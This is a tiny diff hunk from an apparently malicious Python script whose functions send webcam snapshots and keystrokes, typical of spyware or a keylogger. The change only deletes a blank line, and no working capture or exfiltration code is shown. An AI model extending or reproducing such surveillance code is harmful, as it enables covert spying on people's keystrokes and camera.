@@ -165,7 +165,6 @@ def send_webcam_snapshot():
         print("Failed to capture webcam pic")
 
 
-
 def send_key(key):
     try:
         key = key.char
